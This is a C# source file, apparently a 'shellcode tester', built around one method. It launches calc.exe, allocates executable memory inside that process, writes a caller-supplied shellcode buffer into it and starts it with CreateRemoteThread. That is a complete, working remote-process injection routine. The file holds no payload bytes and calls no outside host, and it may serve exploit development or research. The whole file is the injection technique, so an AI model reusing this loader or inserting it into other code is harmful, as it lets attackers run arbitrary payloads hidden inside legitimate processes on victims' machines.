using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace shellcodeTester
{
    public class shellcodeTester
    {
        #region dll imports
        [DllImport("kernel32.dll")]
        static extern bool CreateProcess(string lpApplicationName,
            string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040,
        }

        [DllImport("kernel32.dll")]
        public static extern void WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool Wow64DisableWow64FsRedirection(out IntPtr oldValue);

        [DllImport("kernel32.dll")]
        static extern bool Wow64RevertWow64FsRedirection(IntPtr oldValue);
        
        #endregion

        public static void fireShellcode(uint architecture, byte[] shellcode)
        {
            IntPtr oldValue = IntPtr.Zero;
            bool disabledWOW = false;
            string file = string.Empty;
            if (architecture == 32)
            {
                file = "C:\\Windows\\SysWOW64\\calc.exe";               
            }
            else if (architecture == 64)
            {
                disabledWOW = Wow64DisableWow64FsRedirection(out oldValue);
                file = "C:\\Windows\\System32\\calc.exe";
            }

            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo = new STARTUPINFO();
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            if (!CreateProcess(file, null, ref pSec, ref tSec, false, 0x0020, IntPtr.Zero, null, ref sInfo, out pInfo))
            {
                System.Windows.Forms.MessageBox.Show("Couldn't create process");
                return;
            }
            if (disabledWOW == true)
            {
                Wow64RevertWow64FsRedirection(oldValue);
            }

            System.Threading.Thread.Sleep(2000); 
            IntPtr hHandle = pInfo.hProcess;
            IntPtr hAlloc = VirtualAllocEx(hHandle, IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            UIntPtr bytesWritten = UIntPtr.Zero;
            WriteProcessMemory(hHandle, hAlloc, shellcode, (uint)shellcode.Length, out bytesWritten);
            uint iThreadId = 0;
            IntPtr hThread = CreateRemoteThread(hHandle, IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, out iThreadId);
            System.Threading.Thread.Sleep(1000); 
            CloseHandle(hThread);
            CloseHandle(hHandle);
        }
    }
}

